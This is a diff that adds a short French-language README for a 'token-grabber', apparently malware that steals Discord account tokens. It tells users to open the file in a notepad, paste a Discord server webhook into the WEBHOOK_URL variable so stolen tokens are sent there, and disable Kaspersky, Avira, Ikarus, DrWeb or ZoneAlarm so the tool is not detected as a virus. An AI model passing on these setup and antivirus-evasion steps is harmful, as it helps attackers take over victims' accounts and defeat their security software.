@@ -1,0 +1,33 @@
+yo pour ceux qui veulent tester le token-grabber 
+
+tu peut le tester sur Linux mac ou même windows
+
+d'abord avant de le tester vous allez lancer le fichier 
+
+sur le blocs note 
+
+une fois que c'est lancer
+
+vous allez chezrcher la variable 
+
+WEBHOOK_URL = ''
+
+entre les deux guillemet vous allez mettre le webhook d'un serveur discord
+
+voila 
+
+
+ATTENTION: si vous avez installer l'un de ses antivirus suivant 
+
+Kaspersky
+
+Avira (no cloud)
+
+Ikarus
+
+DrWeb
+
+ZoneAlarm by Check Point
+
+desactiver l'antivirus ou sinon il va le détecter en tant que virus
+
